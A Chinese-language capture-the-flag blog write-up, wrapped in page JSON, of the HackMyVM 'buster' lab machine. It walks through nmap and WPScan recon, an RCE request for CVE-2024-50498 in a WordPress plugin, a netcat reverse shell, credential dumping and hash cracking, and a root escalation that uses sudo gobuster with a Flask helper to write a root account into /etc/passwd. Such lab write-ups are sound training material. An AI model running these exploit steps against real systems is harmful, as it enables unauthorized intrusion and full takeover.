{"pageProps":{"postData":{"id":"HackMyVMbuster","contentHtml":"<h1>buster.</h1>\n<blockquote>\n<p><a href=\"https://hackmyvm.eu/machines/machine.php?vm=buster\">https://hackmyvm.eu/machines/machine.php?vm=buster</a></p>\n</blockquote>\n<p>Notes: <strong>Wish you have fun.</strong></p>\n<h2>前期踩点</h2>\n<p><code>nmap</code>扫描，<code>24</code>是靶机</p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~]\n└─# nmap -sP 192.168.56.0/24\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 05:47 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.1\nHost is up (0.00050s latency).\nMAC Address: 0A:00:27:00:00:09 (Unknown)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.2\nHost is up (0.00035s latency).\nMAC Address: 08:00:27:0F:6C:5D (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.24\nHost is up (0.00051s latency).\nMAC Address: 08:00:27:01:40:98 (Oracle VirtualBox virtual NIC)\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.4\nHost is up.\nNmap <span class=\"hljs-keyword\">done</span>: 256 IP addresses (4 hosts up) scanned <span class=\"hljs-keyword\">in</span> 28.10 seconds\n</code></pre>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~]\n└─# nmap -sT -min-rate 10000 -p- 192.168.56.24\nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 05:49 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.24\nHost is up (0.00086s latency).\nNot shown: 65533 closed tcp ports (conn-refused)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:01:40:98 (Oracle VirtualBox virtual NIC)\n</code></pre>\n<p>可以看到是搭建了<code>WordPress6.7.1</code></p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~]                                                                                                                                          \n└─# nmap -sT -A -T4 -O -p 22,80 192.168.56.24               \nStarting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 05:50 EST\nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.24\nHost is up (0.00054s latency).\nPORT   STATE SERVICE VERSION  \n22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u4 (protocol 2.0)\n| ssh-hostkey:                    \n|   2048 c2:91:d9:a5:f7:a3:98:1f:c1:4a:70:28:aa:ba:a4:10 (RSA)                \n|   256 3e:1f:c9:eb:c0:6f:24:06:<span class=\"hljs-built_in\">fc</span>:52:5f:2f:1b:35:33:ec (ECDSA)\n|_  256 ec:64:87:04:9a:4b:32:fe:2d:1f:9a:b0:81:d3:7c:cf (ED25519)             \n80/tcp open  http    nginx 1.14.2\n|_http-title: bammmmuwe                                                       \n|_http-generator: WordPress 6.7.1      \n| http-robots.txt: 1 disallowed entry \n|_/wp-admin/\n|_http-server-header: nginx/1.14.2     \nMAC Address: 08:00:27:01:40:98 (Oracle VirtualBox virtual NIC)                \nWarning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port                                                        \nDevice <span class=\"hljs-built_in\">type</span>: general purpose                                                  \nRunning: Linux 4.X|5.X            \nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5               \nOS details: Linux 4.15 - 5.8                                                  \nNetwork Distance: 1 hop\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel                       \n                                       \nTRACEROUTE                                                                    \nHOP RTT     ADDRESS                    \n1   0.54 ms 192.168.56.24\n</code></pre>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~]                                                           \n└─# nmap -script=vuln -p 22,80 192.168.56.24\nNSE Timing: About 99.51% <span class=\"hljs-keyword\">done</span>; ETC: 05:53 (0:00:01 remaining)      \nNmap scan report <span class=\"hljs-keyword\">for</span> 192.168.56.24\nHost is up (0.00056s latency).                                                \n                                                                              \nPORT   STATE SERVICE                                                          \n22/tcp open  ssh                 \n80/tcp open  http      \n|_http-csrf: Couldn<span class=\"hljs-string\">'t find any CSRF vulnerabilities.                          \n|_http-dombased-xss: Couldn'</span>t find any DOM based XSS.                         \n|_http-stored-xss: Couldn<span class=\"hljs-string\">'t find any stored XSS vulnerabilities.              \n| http-enum:                      \n|   /wp-login.php: Possible admin folder                      \n|   /wp-json: Possible admin folder                                                                                                                          \n|   /robots.txt: Robots file\n|   /readme.html: Wordpress version: 2                                        \n|   /: WordPress version: 6.7.1                                               \n|   /feed/: Wordpress version: 6.7.1\n|   /wp-includes/images/rss.png: Wordpress version 2.2 found.                 \n|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.\n|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.               \n|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.            \n|   /wp-login.php: Wordpress login page.                                      \n|   /wp-admin/upgrade.php: Wordpress login page.                              \n|   /readme.html: Interesting, a readme.                                      \n|_  /0/: Potentially interesting folder                                                                                                                      \nMAC Address: 08:00:27:01:40:98 (Oracle VirtualBox virtual NIC)\n</span></code></pre>\n<p>访问主页，并查看指纹识别。和扫描的一样是<code>WordPres6.7.1</code></p>\n<p><img src=\"/post-images/HackMyVMbuster/image77.png\" alt=\"image.png\"></p>\n<p>查看网站<code>robots.txt</code>文件</p>\n<pre><code class=\"hljs language-bash\">User-agent: *\nDisallow: /wp-admin/\nAllow: /wp-admin/admin-ajax.php\n\nSitemap: http:/wp-sitemap.xml\n</code></pre>\n<h2>WPScan</h2>\n<p>因为是<code>WordPress</code>，所以可以使用<code>WPScan</code> 来扫描（指定你的<code>API token</code>来扫描漏洞）</p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~]\n└─# wpscan --url 192.168.56.24 --api-token xxxxx -e u,ap\n</code></pre>\n<p>扫了快<code>30</code>分钟，才扫描完成，扫出了一个存在漏洞的插件<code>wp-query-console</code></p>\n<pre><code class=\"hljs language-bash\">[+] wp-query-console\n | Location: http://192.168.56.118/wp-content/plugins/wp-query-console/\n | Latest Version: 1.0 (up to <span class=\"hljs-built_in\">date</span>)\n | Last Updated: 2018-03-16T16:03:00.000Z\n | Readme: http://192.168.56.118/wp-content/plugins/wp-query-console/README.txt\n |\n | Found By: Known Locations (Aggressive Detection)\n |  - http://192.168.56.118/wp-content/plugins/wp-query-console/, status: 403\n |\n | [!] 1 vulnerability identified:\n |\n | [!] Title: WP Query Console &#x3C;= 1.0 - Unauthenticated Remote Code Execution\n |     References:\n |      - https://wpscan.com/vulnerability/f911568d-5f79-49b7-8ce4-fa0da3183214\n |      - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2024-50498\n |      - https://www.wordfence.com/threat-intel/vulnerabilities/id/ae07ca12-e827-43f9-8cbb-275b9abbd4c3\n |\n | Version: 1.0 (80% confidence)\n | Found By: Readme - Stable Tag (Aggressive Detection)\n |  - http://192.168.56.118/wp-content/plugins/wp-query-console/README.txt\n</code></pre>\n<h2>CVE-2024-50498</h2>\n<p>在<code>github</code>上找到：<a href=\"https://github.com/RandomRobbieBF/CVE-2024-50498\">https://github.com/RandomRobbieBF/CVE-2024-50498</a> <code>POC</code> 链接</p>\n<pre><code class=\"hljs language-bash\">POST /wp-json/wqc/v1/query HTTP/1.1\nHost: kubernetes.docker.internal\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:132.0) Gecko/20100101 Firefox/132.0\nAccept: */*\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nReferer: http://kubernetes.docker.internal/wp-admin/admin.php?page=wp-query-console\nContent-Type: application/json\nContent-Length: 45\nOrigin: http://kubernetes.docker.internal\nConnection: keep-alive\nPriority: u=0\n\n{<span class=\"hljs-string\">\"queryArgs\"</span>:<span class=\"hljs-string\">\"phpinfo();\"</span>,<span class=\"hljs-string\">\"queryType\"</span>:<span class=\"hljs-string\">\"post\"</span>}\n</code></pre>\n<p><img src=\"/post-images/HackMyVMbuster/image78.png\" alt=\"image.png\"></p>\n<p>但是打算执行系统命令时发现执行不了，<code>system</code>和<code>exec</code>都使用不了</p>\n<p><img src=\"/post-images/HackMyVMbuster/image79.png\" alt=\"image.png\"></p>\n<p>可能是一些函数被禁用了，搜索一下**<code>*disable_functions</code> ,***一看好家伙禁得还不少，但是<code>shell_exec</code>还没禁用</p>\n<p><img src=\"/post-images/HackMyVMbuster/image80.png\" alt=\"image.png\"></p>\n<p>但是执行命令没有回显</p>\n<p><img src=\"/post-images/HackMyVMbuster/image81.png\" alt=\"image.png\"></p>\n<p><code>ping</code>是可以成功接收到的</p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~]                                                                                                                                          \n└─# tcpdump icmp -i eth1                                                                                                                                     \ntcpdump: verbose output suppressed, use -v[v]... <span class=\"hljs-keyword\">for</span> full protocol decode                                                                                    \nlistening on eth1, link-type EN10MB (Ethernet), snapshot length 262144 bytes                                                                                 \n07:45:12.562498 IP 192.168.56.24 > 192.168.56.4: ICMP <span class=\"hljs-built_in\">echo</span> request, <span class=\"hljs-built_in\">id</span> 1669, <span class=\"hljs-built_in\">seq</span> 63, length 64\n</code></pre>\n<p>尝试反弹<code>shell</code> ，因为闭合问题不能使用<code>/bin/bash</code>弹，使用<code>nc</code>也成功了</p>\n<p><img src=\"/post-images/HackMyVMbuster/image82.png\" alt=\"image.png\"></p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~]\n└─# nc -lvp 4444\nlistening on [any] 4444 ...\n192.168.56.24: inverse host lookup failed: Host name lookup failure\nconnect to [192.168.56.4] from (UNKNOWN) [192.168.56.24] 59298\n</code></pre>\n<h2>靶机信息搜集</h2>\n<p>存在<code>python</code> ，先获得好点的<code>shell</code></p>\n<pre><code class=\"hljs language-bash\">python -c <span class=\"hljs-string\">\"import pty;pty.spawn('/bin/sh')\"</span>\n</code></pre>\n<p>在<code>wp-config.php</code>里面发现数据库账号密码</p>\n<pre><code class=\"hljs language-bash\">/** Database username */                                                                                                                                     \ndefine( <span class=\"hljs-string\">'DB_USER'</span>, <span class=\"hljs-string\">'ll104567'</span> );                                                                                                                             \n                                                                                                                                                             \n/** Database password */                                                      \ndefine( <span class=\"hljs-string\">'DB_PASSWORD'</span>, <span class=\"hljs-string\">'thehandsomeguy'</span> );\n</code></pre>\n<p>查询<code>wp_users</code>数据库</p>\n<pre><code class=\"hljs language-bash\">MariaDB [wordpress]> <span class=\"hljs-keyword\">select</span> * from wp_users;\n<span class=\"hljs-keyword\">select</span> * from wp_users;\n+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+\n| ID | user_login | user_pass                          | user_nicename | user_email        | user_url              | user_registered     | user_activation_key                           | user_status | display_name |\n+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+\n|  1 | ta0        | $P<span class=\"hljs-variable\">$BDDc71nM67DbOVN</span>/U50WFGII6EF6.r. | ta0           | 2814928906@qq.com | http://192.168.31.181 | 2025-01-08 03:10:43 |                                               |           0 | ta0          |\n|  2 | welcome    | $P<span class=\"hljs-variable\">$BtP9ZghJTwDfSn1gKKc</span>.k3mq4Vo.Ko/ | welcome       | 127.0.0.1@qq.com  |                       | 2025-01-08 04:29:28 | 1736310568:$P<span class=\"hljs-variable\">$B2YbhlDVF1XWIurbL11Pfoasb</span>./0tD. |           0 | welcome      |\n+----+------------+------------------------------------+---------------+-------------------+-----------------------+---------------------+-----------------------------------------------+-------------+--------------+\n\n</code></pre>\n<p>将密码保存为<code>pass</code>，如何使用<code>john</code>来破解，爆破出来了</p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~/Desktop/test/buster]\n└─# john --wordlist=/usr/share/wordlists/rockyou.txt pass \nUsing default input encoding: UTF-8\nLoaded 2 password hashes with 2 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])\nCost 1 (iteration count) is 8192 <span class=\"hljs-keyword\">for</span> all loaded hashes\nWill run 8 OpenMP threads\nPress <span class=\"hljs-string\">'q'</span> or Ctrl-C to abort, almost any other key <span class=\"hljs-keyword\">for</span> status\n104567           (?)     \n</code></pre>\n<p>尝试<code>ssh</code>登陆成功</p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~]\n└─# ssh welcome@192.168.56.24 -t bash\nwelcome@192.168.56.24<span class=\"hljs-string\">'s password: \nwelcome@listen:~$ ls\nuser.txt\n</span></code></pre>\n<p>进去后可以在当前目录找到<code>UserFlag</code></p>\n<pre><code class=\"hljs language-bash\">$ <span class=\"hljs-built_in\">cat</span> user.txt\n29e0f786e8c90b3ce82e00de0ec7e7d3\n</code></pre>\n<h2>提权</h2>\n<p>查看权限，可以以<code>root</code>身份执行<code>gobuster</code></p>\n<pre><code class=\"hljs language-bash\">welcome@listen:/$ <span class=\"hljs-built_in\">sudo</span> -l\nMatching Defaults entries <span class=\"hljs-keyword\">for</span> welcome on listen:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser welcome may run the following commands on listen:\n    (ALL) NOPASSWD: /usr/bin/gobuster\n\n</code></pre>\n<p>查看其权限</p>\n<pre><code class=\"hljs language-bash\">welcome@listen:/$ <span class=\"hljs-built_in\">ls</span> -al /usr/bin/gobuster\n-rwxr-xr-x 1 root root 4953296 Jun 13  2023 /usr/bin/gobuster\n</code></pre>\n<p>到这里就不懂了（雾），看了<code>writeup</code>后发现可以利用<code>gobuster</code>中的结果输出到指定文件即可</p>\n<p>先看参数解释</p>\n<pre><code class=\"hljs language-bash\">welcome@listen:/tmp$ gobuster -h                                                                                                                             \nUsage of gobuster:\n  -P string                                                                   \n        Password <span class=\"hljs-keyword\">for</span> Basic Auth (<span class=\"hljs-built_in\">dir</span> mode only)\n  -U string                                                                   \n        Username <span class=\"hljs-keyword\">for</span> Basic Auth (<span class=\"hljs-built_in\">dir</span> mode only)\n  -a string                     \n        Set the User-Agent string (<span class=\"hljs-built_in\">dir</span> mode only)\n  -c string\n        Cookies to use <span class=\"hljs-keyword\">for</span> the requests (<span class=\"hljs-built_in\">dir</span> mode only)\n  -cn      \n        Show CNAME records (dns mode only, cannot be used with <span class=\"hljs-string\">'-i'</span> option)\n  -e    Expanded mode, <span class=\"hljs-built_in\">print</span> full URLs\n  -f    Append a forward-slash to each directory request (<span class=\"hljs-built_in\">dir</span> mode only)      \n  -fw                                                                         \n        Force continued operation when wildcard found\n  -i    Show IP addresses (dns mode only)            \n  -k    Skip SSL certificate verification                                     \n  -l    Include the length of the body <span class=\"hljs-keyword\">in</span> the output (<span class=\"hljs-built_in\">dir</span> mode only)\n  -m string          \n        Directory/File mode (<span class=\"hljs-built_in\">dir</span>) or DNS mode (dns) (default <span class=\"hljs-string\">\"dir\"</span>)           \n  -n    Don<span class=\"hljs-string\">'t print status codes                                              \n  -np                 \n        Don'</span>t display progress                                                \n  -o string                          \n        Output file to write results to (defaults to stdout)\n  -p string                                                                   \n        Proxy to use <span class=\"hljs-keyword\">for</span> requests [http(s)://host:port] (<span class=\"hljs-built_in\">dir</span> mode only)       \n  -q    Don<span class=\"hljs-string\">'t print the banner and other noise       \n  -r    Follow redirects      \n  -s string                                                                   \n        Positive status codes (dir mode only) (default \"200,204,301,302,307,403\")                                                                            \n  -t int          \n        Number of concurrent threads (default 10)                             \n  -to duration                                                                \n        HTTP Timeout in seconds (dir mode only) (default 10s)                 \n  -u string                                                                   \n        The target URL or Domain\n  -v    Verbose output (errors)                                               \n  -w string\n        Path to the wordlist                                                  \n  -x string\n        File extension(s) to search for (dir mode only)                                   \n</span></code></pre>\n<p>例如：我们先创建字典文件<code>wordlist</code> ，里面写入<code>hello</code> 。</p>\n<pre><code class=\"hljs language-bash\">welcome@listen:/tmp$ <span class=\"hljs-built_in\">cat</span> wordlist \nhello\n</code></pre>\n<p>在<code>kali</code>创建<code>hello</code>文件，并创建简易web服务器</p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~/Desktop/test/buster]\n└─# <span class=\"hljs-built_in\">ls</span>\nhello\n\n┌──(root㉿kali)-[~/Desktop/test/buster]\n└─# php -S 0:81\n</code></pre>\n<p>通过<code>gobuster</code>扫描<code>kali</code> 将输出结果放入到<code>test</code>文件</p>\n<p>这样就可以将文字输入带文字了，假如我们将其输入到<code>/etc/passwd</code>文件呢？</p>\n<pre><code class=\"hljs language-bash\">welcome@listen:/tmp$ gobuster -u http://192.168.56.4:81/ -w wordlist -n -q -o <span class=\"hljs-built_in\">test</span>\n/hello\nwelcome@listen:/tmp$ <span class=\"hljs-built_in\">cat</span> <span class=\"hljs-built_in\">test</span>\n/hello\n</code></pre>\n<p>我们打算计划向<code>/etc/passwd</code>写入<code>hack:zSZ7Whrr8hgwY:0:0::/root/:/bin/bash</code> （长度为<code>40</code>） 但是因为会触发交换文件。</p>\n<p>所以打算创建<code>web</code>服务器，将接收到路径长度<code>≠40</code>的数据包都返回<code>200</code> ，那么就会输出中写出来</p>\n<p>(代码参照：<a href=\"https://7r1umph.github.io/post/hmv_buster.html#4.%E6%8F%90%E6%9D%83\">https://7r1umph.github.io/post/hmv_buster.html#4.%E6%8F%90%E6%9D%83</a>)</p>\n<pre><code class=\"hljs language-bash\">from flask import Flask, Response\n\napp = Flask(__name__)\n\n@app.route(<span class=\"hljs-string\">'/'</span>, defaults={<span class=\"hljs-string\">'path'</span>: <span class=\"hljs-string\">''</span>})\n<span class=\"hljs-comment\"># 接收所有路径</span>\n@app.route(<span class=\"hljs-string\">'/&#x3C;path:path>'</span>)\n<span class=\"hljs-comment\"># catch_all 处理所有请求</span>\ndef catch_all(path):\n\t\t<span class=\"hljs-comment\"># 参数path是从url中提取的路径</span>\n    <span class=\"hljs-keyword\">if</span> len(path) == 1:\n        <span class=\"hljs-built_in\">return</span> Response(status=404)\n    <span class=\"hljs-keyword\">else</span>:\n        <span class=\"hljs-built_in\">return</span> Response(status=200)\n\n<span class=\"hljs-keyword\">if</span> __name__ == <span class=\"hljs-string\">'__main__'</span>:\n    app.run(host=<span class=\"hljs-string\">\"0.0.0.0\"</span>, port=81) \n</code></pre>\n<p>启动服务器</p>\n<pre><code class=\"hljs language-bash\">┌──(root㉿kali)-[~/Desktop/test/buster]\n└─# python3 a.py\n * Serving Flask app <span class=\"hljs-string\">'a'</span>\n * Debug mode: off\nWARNING: This is a development server. Do not use it <span class=\"hljs-keyword\">in</span> a production deployment. Use a production WSGI server instead.\n * Running on all addresses (0.0.0.0)\n * Running on http://127.0.0.1:81\nPress CTRL+C to quit\n</code></pre>\n<p>靶机在字典中写入<code>hack:zSZ7Whrr8hgwY:0:0::/root/:/bin/bash</code> ，并使用<code>gobuster</code>将其写入<code>/etc/passwd</code></p>\n<pre><code class=\"hljs language-bash\">welcome@listen:/tmp$ <span class=\"hljs-built_in\">echo</span> <span class=\"hljs-string\">\"hack:zSZ7Whrr8hgwY:0:0::/root/:/bin/bash\"</span> > wordlist\nwelcome@listen:/tmp$ <span class=\"hljs-built_in\">sudo</span> /usr/bin/gobuster -w wordlist -u http://192.168.56.4:81/ -n -q -fw -o /etc/passwd                                                  \n</code></pre>\n<p>切换到到<code>/hack</code>用户，密码<code>123456</code></p>\n<pre><code class=\"hljs language-bash\">/hack@listen:/tmp# <span class=\"hljs-built_in\">id</span>\nuid=0(/hack) gid=0(root) <span class=\"hljs-built_in\">groups</span>=0(root)\n</code></pre>\n<p>读取<code>RootFlag</code></p>\n<pre><code class=\"hljs language-bash\">/hack@listen:/root# <span class=\"hljs-built_in\">cat</span> R00t_fl4g_is_HHHHerererererrererere.txt \nb6a1a0de4223ba038327fc9c647701fb\n</code></pre>\n<h2>总结</h2>\n<p>更加熟练对<code>wpscan</code>的使用，以及学到如何使用<code>gobuster</code>提权，如何使用<code>flask</code>搭建简易服务器</p>","title":"HackMyVM - buster","date":"2025-02-20","updated":"2025-02-20","comments":true,"tags":["Linux靶机","HackMyVM"],"categories":"靶机","description":"buster.\n\n https://hackmyvm.eu/machines/machine.php?vm=buster\n \n\nNotes: Wish you have fun.\n\n前期踩点\n\n`nmap`扫描，`24`是靶机\n\n\n\n\n\n可以看到是搭建了`WordPress6.7.1`\n\n\n\n\n\n访问主页，并查看指纹识别。和扫描的一样是`WordPres6.7.1`\n\n\n\n查看网站`robots...."},"recentPosts":[{"id":"TheHackersLabsShadowGate","title":"TheHackersLabs - ShadowGate","date":"2025-08-06","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"HackTheBoxSeason7-Code","title":"HackTheBox - Machine - Code","date":"2025-04-04","isEncrypted":false,"year":"2025","month":"08","day":"06"},{"id":"TheHackersLabsOfusPingu","title":"TheHackersLabs - OfusPingu","date":"2025-08-05","isEncrypted":false,"year":"2025","month":"08","day":"05"},{"id":"TheHackersLabsDoraemon","title":"TheHackersLabs - Doraemon","date":"2025-08-03","isEncrypted":false,"year":"2025","month":"08","day":"03"},{"id":"HackTheBoxSeason8 - Editor","title":"HackTheBox - Season8 - Editor","date":"2025-08-03","isEncrypted":true,"year":"2025","month":"08","day":"03"},{"id":"TheHackersLabsHellRoot","title":"TheHackersLabs - HellRoot","date":"2025-08-02","isEncrypted":false,"year":"2025","month":"08","day":"02"},{"id":"群U靶机 - Cliv2","title":"群U靶机 - Cliv2","date":"2025-07-31","isEncrypted":false,"year":"2025","month":"07","day":"31"}]},"__N_SSG":true}